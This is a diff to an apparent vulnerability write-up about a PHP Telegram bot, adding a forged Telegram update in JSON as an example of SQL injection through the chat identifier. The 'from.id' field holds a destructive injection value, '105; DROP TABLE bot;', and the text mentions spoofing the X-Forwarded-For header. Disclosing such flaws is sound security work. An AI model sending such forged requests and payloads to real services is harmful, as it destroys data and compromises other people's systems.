@@ -14,6 +14,23 @@ you only need to change the ```X-Forwarded-For``` Header value in the HTTP-Reque
 
 Another very big issue found in this project is the multitude of potential SQL Injections found:
 whenever ```$chat_id``` is used, there is a possible SQLi, due to the fact that it's always possible to change it in the fake request body, allowing us to drop tables, overwrite data and so on.
+``` JSON
+{
+  "update_id": 143970686,
+  "message": {
+    "message_id": 235833,
+    "from": {
+      "id": "105; DROP TABLE bot;",
+      "is_bot": false,
+      "first_name": "Lorenzo",
+      "username": "pwnedbyrelooandwilkenfeld ':D'",
+      "language_code": "it"
+    },
+    "date": 1595933493,
+    "text": "/start"
+  }
+}
+```
 
 ### 3. Deadly Get Param Check in [bot.php](https://github.com/GiacomoDevIT/GjacBot-SQL/blob/master/bot.php)
 
